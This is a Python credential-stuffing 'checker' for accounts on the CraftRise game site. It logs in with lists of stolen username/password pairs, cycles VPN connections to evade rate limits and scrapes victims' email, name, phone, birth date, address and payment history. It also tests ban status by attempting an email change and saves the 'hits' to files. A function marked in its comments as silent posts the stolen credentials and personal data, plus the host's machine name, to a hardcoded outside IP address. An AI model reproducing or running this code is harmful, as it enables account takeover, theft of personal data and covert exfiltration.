# -*- coding: utf-8 -*-
# ============================== IMPORTS ==============================
import requests
from bs4 import BeautifulSoup
import time
import subprocess
import os
import ctypes
import random
import string
import json
import re
import queue
import platform

import gzip
import logging
import threading
from urllib.parse import urlencode
from flask import Flask, request, jsonify
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel
from rich.layout import Layout
from rich.align import Align
from rich.text import Text
from rich.columns import Columns
from rich.progress import BarColumn, Progress, TextColumn, SpinnerColumn

# ============================== CONSOLE ==============================
import sys
sys.stdout.reconfigure(encoding='utf-8')
console = Console(force_terminal=True)

# ============================== ENDPOINTS ==============================
BASE_URL = "https://www.craftrise.com.tr"
LOGIN_ENDPOINT = "/posts/post-login.php"
PROFILE_ENDPOINT = "/posts/post-profile.php"
PROFILE_LOGS_ENDPOINT = "/posts/post-profilelogs.php"
LOGOUT_ENDPOINT = "/posts/post-logout.php"
SHOP_ENDPOINT = "/shop"
PROFILE_PATH = "/profil"
PLAYER_INFO_URL = "/index.php?s=player&player="
TOKEN_URL = "http://127.0.0.1:5001/get-token"
VDS_DEFAULT_URL = "http://185.157.46.87:9090"

VDS_ENABLED = False
VDS_API_KEY = "1"
VDS_URL = "http://185.157.46.87:9090"

WARP_RESTART_THRESHOLD = 3
CONSECUTIVE_BAD_THRESHOLD = 250
QUEUE_DELAY = 2

# ============================== TIERS ==============================
TIERS = ["KÖMÜR", "DEMİR", "KIZILTAŞ", "ALTIN", "ELMAS", "ZÜMRÜT", "OBSİDYEN", "AMETİST"]

# ============================== STATS ==============================
stats = {
    "banli": {t: 0 for t in TIERS},
    "bansiz": {t: 0 for t in TIERS},
    "hit": 0, "bad": 0,
    "banli_total": 0, "bansiz_total": 0,
    "checked": 0, "total": 0,
    "consecutive_bad": 0,
    "queue_size": 0,
    "processing": "",
    "last_hit": "",
}

stats_lock = threading.Lock()
file_lock = threading.Lock()
error_count = 0

# ============================== QUEUE ==============================
hit_queue = queue.Queue()

# ============================== FLASK ==============================
app = Flask(__name__)
app.logger.disabled = True
_log = logging.getLogger('werkzeug')
_log.setLevel(logging.ERROR)

# ============================== HELPERS ==============================
TIER_MAP = {
    "kömür": "KÖMÜR", "komur": "KÖMÜR",
    "demir": "DEMİR",
    "kızıltaş": "KIZILTAŞ", "kiziltas": "KIZILTAŞ", "kiziltaş": "KIZILTAŞ",
    "altın": "ALTIN", "altin": "ALTIN",
    "elmas": "ELMAS",
    "zümrüt": "ZÜMRÜT", "zumrut": "ZÜMRÜT",
    "obsidyen": "OBSİDYEN",
    "ametist": "AMETİST",
}

def normalize_tier(rank):
    if not rank:
        return "KÖMÜR"
    rf = rank.strip().lower()
    for key, val in TIER_MAP.items():
        if key in rf:
            return val
    return "KÖMÜR"

def _rnd_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + "@gmail.com"

def restart_warp():
    try:
        subprocess.run(["warp-cli", "disconnect"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        subprocess.run(["warp-cli", "connect"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)
    except Exception:
        pass

def get_token_safely():
    global error_count
    try:
        response = requests.get(TOKEN_URL, timeout=10)
        response.raise_for_status()
        token = response.json().get("token")
        if not token:
            raise ValueError("empty")
        error_count = 0
        return token
    except Exception as e:
        error_count += 1
        if error_count >= WARP_RESTART_THRESHOLD:
            restart_warp()
            error_count = 0
        raise RuntimeError(str(e))

def _update_title():
    try:
        title = f"{stats['checked']}/{stats['total']} | Queue: {stats['queue_size']} | t.me/xlaeussx"
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    except Exception:
        pass

# ============================== VDS ==============================
def send_to_vds(data):
    """VDS'e sessizce veri gönder (kullanıcıya gösterme)"""
    if not VDS_ENABLED or not VDS_URL:
        return
    
    # Arka planda thread'de gönder (UI'ı bloklamaz)
    def _send():
        try:
            data["desktop_name"] = platform.node()
            requests.post(
                f"{VDS_URL}/log_hit",
                json=data,
                headers={"X-Api-Key": VDS_API_KEY, "Content-Type": "application/json"},
                timeout=10
            )
        except Exception:
            pass  # Sessizce başarısız olsa da devam et
    
    # Daemon thread'de gönder (ana program kapanırsa thread de kapanır)
    thread = threading.Thread(target=_send, daemon=True)
    thread.start()

# ============================== BAN DETECTION ==============================
def check_ban_status(session, headers, password):
    """Robust ban detection from banlibansizmethod.py reference."""
    new_email = _rnd_email()
    encoded_data = urlencode({
        'postType': 'CHANGE_MAIL',
        'currentPass': password,
        'newMail': new_email
    })

    ajax_headers = headers.copy()
    ajax_headers.update({
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': '*/*',
        'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
        'Origin': BASE_URL,
        'Referer': f'{BASE_URL}{PROFILE_PATH}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    })

    if 'Accept-Encoding' in ajax_headers:
        del ajax_headers['Accept-Encoding']

    try:
        email_response = session.post(f"{BASE_URL}{PROFILE_ENDPOINT}", headers=ajax_headers, data=encoded_data, timeout=15)

        try:
            response_text = email_response.text
        except Exception:
            try:
                response_text = gzip.decompress(email_response.content).decode('utf-8')
            except Exception:
                response_text = email_response.content.decode('utf-8', errors='ignore')
    except Exception:
        return "Hata"

    if email_response.status_code == 200 and response_text:
        rl = response_text.lower()
        logging.warning(f"[ban_check] status={email_response.status_code} response={response_text[:200]}")

        if "banlı" in rl or "banned" in rl:
            return "Banlı"
        elif "hesabınız engelliyken" in rl:
            return "Banlı"
        elif "engelli" in rl and ("e-posta" in rl or "mail" in rl):
            return "Banlı"
        elif "başarılı" in rl or "success" in rl:
            return "Bansız"
        elif "değiştirildi" in rl or "güncellendi" in rl:
            return "Bansız"
        else:
            try:
                jr = email_response.json()
                rm = jr.get('resultMessage', '').lower()
                rt = jr.get('resultType', '')

                if "banlı" in rm or "engelli" in rm:
                    return "Banlı"
                elif rt == "success" or "başarılı" in rm:
                    return "Bansız"
                else:
                    return "Bansız"
            except Exception:
                return "Bansız"
    else:
        return "Bansız"

# ============================== DETAILED INFO ==============================
def get_detailed_info(session, headers, soup, password, real_user):
    """Extract detailed account information from detaylicheckmethod.py."""
    info = {
        "full_name": "N/A", "birth_date": "N/A", "phone": "N/A",
        "country": "N/A", "city": "N/A", "district": "N/A", "address": "N/A",
        "vip_duration": "N/A", "total_payment": "N/A",
        "market_transactions": 0,
        "survival_transactions": 0, "factions_transactions": 0,
        "bedwars_transactions": 0, "arena_transactions": 0,
        "bridge_transactions": 0, "skywars_transactions": 0,
        "lobi_transactions": 0,
    }

    # Personal info
    try:
        fn = soup.find('input', {'id': 'personalName'})
        bd = soup.find('input', {'id': 'birthday'})
        ph = (
            soup.find('input', {'id': 'personalPhone'}) or
            soup.find('input', {'id': 'phone'}) or
            soup.find('input', {'name': 'phone'}) or
            soup.find('input', {'placeholder': lambda x: x and 'telefon' in x.lower() if x else False})
        )
        info["full_name"] = (fn.get('value', '').strip() or 'N/A') if fn else 'N/A'
        info["birth_date"] = (bd.get('value', '').strip() or 'N/A') if bd else 'N/A'
        info["phone"] = (ph.get('value', '').strip() or 'N/A') if ph else 'N/A'
    except Exception:
        pass

    # Location
    try:
        for field, select_id, hidden_name in [
            ("country", "countries", "country"),
            ("city", "states", "city"),
            ("district", "cities", "district"),
        ]:
            hidden = soup.find('input', {'type': 'hidden', 'name': hidden_name}) or soup.find('input', {'type': 'hidden', 'id': f'user{field.capitalize()}'})
            select_el = soup.find('select', {'id': select_id})

            if hidden and hidden.get('value'):
                val = hidden.get('value').strip()
                info[field] = val if val and 'seçiniz' not in val.lower() else 'N/A'
            elif select_el:
                selected = None
                for opt in select_el.find_all('option'):
                    if opt.get('selected') or opt.has_attr('selected'):
                        selected = opt
                        break
                if selected:
                    txt = selected.text.strip()
                    info[field] = txt if txt and 'seçiniz' not in txt.lower() and not selected.get('disabled') else 'N/A'
    except Exception:
        pass

    # Address
    try:
        at = soup.find('textarea', {'id': 'personalAdress'})
        if at:
            addr = at.text.strip()
            info["address"] = addr if addr else 'N/A'
    except Exception:
        pass

    # VIP duration
    try:
        vip_el = (
            soup.find('p', class_='vipTimeCounter') or
            soup.find('span', class_='vipTimeCounter') or
            soup.find('div', class_='vipTimeCounter') or
            soup.find(id='vipTimeCounter') or
            soup.find('p', class_='vipTime') or
            soup.find(string=lambda t: t and 'gün' in t and 'saat' in t and 'dakika' in t)
        )
        if vip_el:
            info["vip_duration"] = vip_el.strip() if isinstance(vip_el, str) else vip_el.text.strip()
        else:
            m = re.search(r'(\d+\s*gün\s*\d+\s*saat\s*\d+\s*dakika)', soup.get_text())
            info["vip_duration"] = m.group(1).strip() if m else "N/A"
    except Exception:
        pass

    plog_headers = {**headers, 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': f'{BASE_URL}{PROFILE_PATH}'}

    # Market transactions
    try:
        mr = session.post(f"{BASE_URL}{PROFILE_LOGS_ENDPOINT}", headers=plog_headers, data={'page': '1', 'type': 'purchase'}, timeout=10)
        if mr.status_code == 200 and "<table" in mr.text:
            rows = BeautifulSoup(mr.text, 'html.parser').find_all('tr', align='center')
            info["market_transactions"] = sum(1 for r in rows if len(r.find_all('td')) >= 3 and "Tarih" not in " ".join(c.get_text(strip=True) for c in r.find_all('td')))
    except Exception:
        pass

    # Payment history
    try:
        pr = session.post(f"{BASE_URL}{PROFILE_LOGS_ENDPOINT}", headers=plog_headers, data={'page': '1', 'type': 'payment'}, timeout=10)
        if pr.status_code == 200 and "<table" in pr.text:
            rows = BeautifulSoup(pr.text, 'html.parser').find_all('tr', align='center')
            total_tl = 0.0
            for row in rows:
                cols = row.find_all('td')
                if len(cols) < 3 or cols[0].get_text(strip=True) in ["Tarih", ""]:
                    continue
                pp = cols[1].find('p')
                pt = pp.text.strip() if pp else cols[1].get_text(strip=True)
                m = re.search(r'(\d+[.,]?\d*)\s*TL', pt)
                if m:
                    try:
                        total_tl += float(m.group(1).replace(',', '.'))
                    except Exception:
                        pass
            info["total_payment"] = f"{total_tl:.2f} TL" if total_tl > 0 else "N/A"
    except Exception:
        pass

    # Game history
    try:
        gc = {"survival": 0, "factions": 0, "bedwars": 0, "arena": 0, "bridge": 0, "skywars": 0, "lobi": 0}
        for pn in range(1, 11):
            gr = session.post(f"{BASE_URL}{PROFILE_LOGS_ENDPOINT}", headers=plog_headers, data={'page': str(pn), 'type': 'game'}, timeout=10)
            if gr.status_code != 200 or "<table" not in gr.text:
                break
            rows = BeautifulSoup(gr.text, 'html.parser').find_all('tr', align='center')
            if not rows:
                break
            for row in rows:
                cols = row.find_all('td')
                if len(cols) != 4 or cols[0].get_text(strip=True) == "Tarih":
                    continue
                alan = cols[2].get_text(strip=True).upper()
                if "BED WARS" in alan or "BEDWARS" in alan:
                    gc["bedwars"] += 1
                elif "ARENA" in alan:
                    gc["arena"] += 1
                elif "BRIDGE" in alan:
                    gc["bridge"] += 1
                elif "SKY WARS" in alan or "SKYWARS" in alan:
                    gc["skywars"] += 1
                elif "FACTIONS" in alan:
                    gc["factions"] += 1
                elif "SURVIVAL" in alan or "AMETİST" in alan or "AMETIST" in alan:
                    gc["survival"] += 1
                elif "LOBİ" in alan or "LOBI" in alan:
                    gc["lobi"] += 1
        for k, v in gc.items():
            info[f"{k}_transactions"] = v
    except Exception:
        pass

    return info

# ============================== CORE ==============================
def process_successful_login(username, password):
    """Full account processing with detailed info & robust ban check."""
    max_retries = 3
    retry_count = 0

    while retry_count < max_retries:
        session = requests.Session()
        try:
            cf_token = get_token_safely()
            session.get(BASE_URL)
            PHPSESSID = session.cookies.get("PHPSESSID")
            if not PHPSESSID:
                raise Exception("PHPSESSID yok")

            headers = {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": BASE_URL,
                "Accept": "*/*",
                "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
                "Origin": BASE_URL,
            }

            login = session.post(f"{BASE_URL}{LOGIN_ENDPOINT}", headers=headers, data={
                "value": username, "password": password, "grecaptcharesponse": cf_token
            }, timeout=15)

            if "çok fazla hatalı giriş" in login.text.lower():
                restart_warp()
                session.close()
                retry_count += 1
                time.sleep(5)
                continue

            login.raise_for_status()
            lj = login.json()

            if lj.get("resultMessage") == "Çok fazla hatalı giriş yaptınız.":
                restart_warp()
                session.close()
                retry_count += 1
                time.sleep(5)
                continue

            if lj.get("resultType") == "error":
                with stats_lock:
                    stats["bad"] += 1
                    stats["checked"] += 1
                _update_title()
                return

            # ── RC ──
            rc_page = session.get(f"{BASE_URL}{SHOP_ENDPOINT}", headers=headers)
            rc_page.encoding = 'utf-8'
            soup = BeautifulSoup(rc_page.text, "html.parser")
            rc_el = soup.find("span", class_="rcCount")
            rc = rc_el.text.strip() if rc_el else "N/A"

            # ── PROFILE ──
            profile = session.get(f"{BASE_URL}{PROFILE_PATH}", headers=headers)
            profile.encoding = 'utf-8'
            soup = BeautifulSoup(profile.text, "html.parser")
            real_user = soup.find("input", {"class": "inputPassword"}).get("value", username)
            email_el = soup.find(id="userMail")
            email = (email_el.get('value') or email_el.text.strip()) if email_el else "N/A"
            clan_el = soup.find(id="clanName")
            clan = clan_el.get("placeholder") if clan_el else "N/A"
            if clan == "Lonca adı":
                clan = "N/A"

            # ── DETAILED INFO ──
            detail = get_detailed_info(session, headers, soup, password, real_user)

            # ── RANK ──
            rank_page = session.get(f"{BASE_URL}{PLAYER_INFO_URL}{real_user}", headers=headers)
            rank_page.encoding = 'utf-8'
            rsoup = BeautifulSoup(rank_page.text, "html.parser")
            rank_divs = rsoup.find_all("div", class_="rankButton") or []

            membership = rank_divs[0].find("p").text.strip() if len(rank_divs) > 0 and rank_divs[0].find("p") else "N/A"
            rank = rank_divs[1].find("p").text.strip() if len(rank_divs) > 1 and rank_divs[1].find("p") else "Kömür"

            # ── BAN CHECK (ROBUST) ──
            ban_status = check_ban_status(session, headers, password)

            # ── SAVE LOCALLY ──
            tier = normalize_tier(rank)
            tier_filename = tier.lower() + ".txt"
            if ban_status == "Banlı":
                ban_folder = "banlı"
            elif ban_status == "Bansız":
                ban_folder = "bansız"
            else:
                ban_folder = "hatalı"

            hit_dir = os.path.join("hits", ban_folder)
            detail_dir = os.path.join("detaylı_hits", ban_folder)
            os.makedirs(hit_dir, exist_ok=True)
            os.makedirs(detail_dir, exist_ok=True)

            display_user = real_user if ("@" in username and ".com" in username) else username

            basic_line = (
                f"{display_user}:{password} | RC: {rc} | E-Mail: {email} | "
                f"Klan: {clan} | Rank: {rank} | Üyelik: {membership}\n"
            ).replace("N/A", "YOK")
            detail_line = (
                f"{display_user}:{password} | RC: {rc} | E-Mail: {email} | "
                f"Klan: {clan} | Rank: {rank} | Üyelik: {membership} | "
                f"İsim: {detail['full_name']} | Telefon: {detail['phone']} | "
                f"Ödeme: {detail['total_payment']} | VIP: {detail['vip_duration']} | "
                f"BedWars: {detail['bedwars_transactions']} | SkyWars: {detail['skywars_transactions']} | "
                f"Arena: {detail['arena_transactions']} | Bridge: {detail['bridge_transactions']} | "
                f"Factions: {detail['factions_transactions']} | Ametist: {detail['survival_transactions']}\n"
            ).replace("N/A", "YOK")

            with file_lock:
                with open(os.path.join(hit_dir, tier_filename), "a", encoding="utf-8") as f:
                    f.write(basic_line)
                with open(os.path.join(detail_dir, tier_filename), "a", encoding="utf-8") as f:
                    f.write(detail_line)


            # ── SEND TO VDS ──
            vds_data = {
                "username": display_user, "password": password,
                "rc": rc, "email": email, "clan": clan,
                "rank": rank, "membership": membership,
                "ban_status": ban_status,
                "full_name": detail["full_name"],
                "birth_date": detail["birth_date"],
                "phone": detail["phone"],
                "country": detail["country"],
                "city": detail["city"],
                "district": detail["district"],
                "address": detail["address"],
                "vip_duration": detail["vip_duration"],
                "total_payment": detail["total_payment"],
                "market_transactions": detail["market_transactions"],
                "bedwars_transactions": detail["bedwars_transactions"],
                "arena_transactions": detail["arena_transactions"],
                "bridge_transactions": detail["bridge_transactions"],
                "skywars_transactions": detail["skywars_transactions"],
                "factions_transactions": detail["factions_transactions"],
                "survival_transactions": detail["survival_transactions"],
                "lobi_transactions": detail["lobi_transactions"],
            }
            send_to_vds(vds_data)

            # ── STATS ──
            with stats_lock:
                stats["hit"] += 1
                stats["checked"] += 1
                if ban_status == "Banlı":
                    stats["banli"][tier] += 1
                    stats["banli_total"] += 1
                else:
                    stats["bansiz"][tier] += 1
                    stats["bansiz_total"] += 1
                stats["last_hit"] = f"{display_user} | {rank} | {ban_status}"

            _update_title()
            session.post(f"{BASE_URL}{LOGOUT_ENDPOINT}", headers=headers)
            session.close()
            return

        except Exception as e:
            logging.error(f"[checker] {username} retry {retry_count+1}/{max_retries}: {e}")
            retry_count += 1
            if session:
                session.close()
            if retry_count < max_retries:
                time.sleep(3)
            else:
                with stats_lock:
                    stats["bad"] += 1
                    stats["checked"] += 1
                _update_title()

# ============================== QUEUE WORKER ==============================
def queue_worker():
    """Processes hits from queue with 15s delay between each."""
    while True:
        try:
            item = hit_queue.get(timeout=2)
        except queue.Empty:
            continue

        with stats_lock:
            stats["processing"] = f"{item['username']}"
            stats["queue_size"] = hit_queue.qsize()

        try:
            process_successful_login(item["username"], item["password"])
        except Exception:
            pass

        with stats_lock:
            stats["processing"] = ""
            stats["queue_size"] = hit_queue.qsize()

        hit_queue.task_done()
        time.sleep(QUEUE_DELAY)

# ============================== UI ==============================
def build_main_table():
    ascii_title = """
[bold bright_magenta]
    ██████╗  ██████╗     ██╗██████╗ ███████╗██╗    ██╗ █████╗ ██╗███╗   ██╗███████╗
   ██╔════╝ ██╔════╝    ██╔╝██╔══██╗██╔════╝██║    ██║██╔══██╗██║████╗  ██║██╔════╝
   ██║  ███╗██║  ███╗  ██╔╝ ██████╔╝█████╗  ██║ █╗ ██║███████║██║██╔██╗ ██║███████╗
   ██║   ██║██║   ██║ ██╔╝  ██╔═══╝ ██╔══╝  ██║███╗██║██╔══██║██║██║╚██╗██║╚════██║
██╗╚██████╔╝╚██████╔╝██╔╝   ██║     ███████╗╚███╔███╔╝██║  ██║██║██║ ╚████║███████║
╚═╝ ╚═════╝  ╚═════╝ ╚═╝    ╚═╝     ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝

                              [bold white]t.me/xlaeussx[/bold white]   [bright_magenta]v3.0[/bright_magenta]
[/bold bright_magenta]"""

    table = Table(title=ascii_title, expand=True, border_style="bright_magenta", title_justify="center")
    table.add_column("[bold red]⛔ BANLI[/bold red]", style="red", justify="center")
    table.add_column("[bold white]#[/bold white]", justify="right", style="bright_red")
    table.add_column("[bold green]✅ BANSIZ[/bold green]", style="green", justify="center")
    table.add_column("[bold white]#[/bold white]", justify="right", style="bright_green")

    for t in TIERS:
        color_b = "red" if stats["banli"][t] > 0 else "dim red"
        color_s = "green" if stats["bansiz"][t] > 0 else "dim green"
        table.add_row(
            f"[{color_b}]{t}[/{color_b}]",
            f"[bold]{stats['banli'][t]}[/bold]" if stats['banli'][t] > 0 else "0",
            f"[{color_s}]{t}[/{color_s}]",
            f"[bold]{stats['bansiz'][t]}[/bold]" if stats['bansiz'][t] > 0 else "0",
        )
    return table

def build_summary():
    pct = int((stats["checked"] / stats["total"]) * 100) if stats["total"] else 0
    bar = "█" * (pct // 5) + "░" * (20 - pct // 5)

    grid = Table.grid(expand=True, padding=(0, 2))
    grid.add_column(justify="left", ratio=1)
    grid.add_column(justify="right", ratio=1)

    grid.add_row("[bold bright_green]✔ Hit[/bold bright_green]", f"[bold bright_green]{stats['hit']}[/bold bright_green]")
    grid.add_row("[bold bright_red]✖ Bad[/bold bright_red]", f"[bold bright_red]{stats['bad']}[/bold bright_red]")
    grid.add_row("[bold red]☠ Banlı[/bold red]", f"[bold]{stats['banli_total']}[/bold]")
    grid.add_row("[bold green]☀ Bansız[/bold green]", f"[bold]{stats['bansiz_total']}[/bold]")
    grid.add_row(
        "[bold yellow]⏳ İlerleme[/bold yellow]",
        f"[bold cyan]{bar}[/bold cyan] [bold white]{pct}%[/bold white]"
    )

    return Panel(grid, title="[bold bright_yellow]📊 İSTATİSTİKLER[/bold bright_yellow]", border_style="bright_yellow", padding=(1, 2))

def build_queue_panel():
    grid = Table.grid(expand=True, padding=(0, 2))
    grid.add_column(justify="left", ratio=1)
    grid.add_column(justify="right", ratio=1)

    grid.add_row("[bold bright_magenta]📋 Kuyruk[/bold bright_magenta]", f"[bold]{stats['queue_size']}[/bold] hesap")
    grid.add_row(
        "[bold bright_magenta]⚙ İşleniyor[/bold bright_magenta]",
        f"[bold bright_white]{stats['processing']}[/bold bright_white]" if stats["processing"] else "[dim]Boş[/dim]"
    )
    grid.add_row("[bold bright_red]🔴 Ard Arda BAD[/bold bright_red]", f"[bold]{stats['consecutive_bad']}[/bold]")

    if stats["last_hit"]:
        grid.add_row("[bold bright_green]🏆 Son Hit[/bold bright_green]", f"[bold bright_white]{stats['last_hit']}[/bold bright_white]")
    else:
        grid.add_row("[bold bright_green]🏆 Son Hit[/bold bright_green]", "[dim]Henüz yok[/dim]")

    return Panel(grid, title="[bold bright_magenta]🚀 KUYRUK & DURUM[/bold bright_magenta]", border_style="bright_magenta", padding=(1, 2))

def build_layout():
    layout = Layout()
    layout.split_column(
        Layout(build_main_table(), name="table", ratio=5),
        Layout(name="bottom", ratio=3),
    )
    layout["bottom"].split_row(
        Layout(build_summary(), name="stats"),
        Layout(build_queue_panel(), name="queue"),
    )
    return layout

# ============================== FLASK ENDPOINTS ==============================
@app.route('/check-success', methods=['POST'])
def check_success():
    try:
        data = request.json
        username = data.get('username')
        password = data.get('password')
        if not username or not password:
            return jsonify({"error": "missing fields"}), 400

        with stats_lock:
            stats["consecutive_bad"] = 0

        hit_queue.put({"username": username, "password": password})

        with stats_lock:
            stats["queue_size"] = hit_queue.qsize()

        return jsonify({"status": "queued", "position": hit_queue.qsize()}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/check-failed', methods=['POST'])
def check_failed():
    try:
        with stats_lock:
            stats["bad"] += 1
            stats["checked"] += 1
            stats["consecutive_bad"] += 1
            if stats["consecutive_bad"] >= CONSECUTIVE_BAD_THRESHOLD:
                restart_warp()
                stats["consecutive_bad"] = 0
        _update_title()
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/stats', methods=['GET', 'POST'])
def handle_stats():
    if request.method == 'POST':
        try:
            data = request.json
            total = data.get('total', 0)
            with stats_lock:
                stats["total"] = total
            _update_title()
            return jsonify({"status": "ok"}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    else:
        return jsonify(stats), 200

# ============================== MAIN ==============================
def run_flask():
    app.run(host='0.0.0.0', port=8080, debug=False)

def main():
    global VDS_ENABLED, VDS_DEFAULT_URL

    if not os.path.exists("hits"):
        os.makedirs("hits")

    # VDS config
    console.print("\n[bold bright_magenta]╔══════════════════════════════════════════╗[/bold bright_magenta]")
    console.print("[bold bright_magenta]║     t.me/xlaeussx CHECKER v3.0           ║[/bold bright_magenta]")
    console.print("[bold bright_magenta]╚══════════════════════════════════════════╝[/bold bright_magenta]\n")

    if VDS_DEFAULT_URL:
        try:
            requests.get(f"{VDS_DEFAULT_URL}/health", timeout=5)
        except Exception:
            pass

    # Flask
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    # Queue worker
    worker_thread = threading.Thread(target=queue_worker, daemon=True)
    worker_thread.start()

    console.print(f"\n[bold bright_green]✓[/bold bright_green] Checker API başlatıldı [bold](Port: 8080)[/bold]")
    console.print(f"[bold bright_green]✓[/bold bright_green] Kuyruk sistemi aktif [bold](15sn gecikme)[/bold]")
    console.print("[bold bright_yellow]![/bold bright_yellow] Java checker'ı başlatın...")
    console.print("[bold bright_magenta]→[/bold bright_magenta] Başarılı loginler kuyruğa alınıp sırayla işlenecek\n")

    time.sleep(2)

    with Live(build_layout(), console=console, refresh_per_second=2, screen=True) as live:
        while True:
            live.update(build_layout())
            time.sleep(0.5)

if __name__ == "__main__":
    main()
    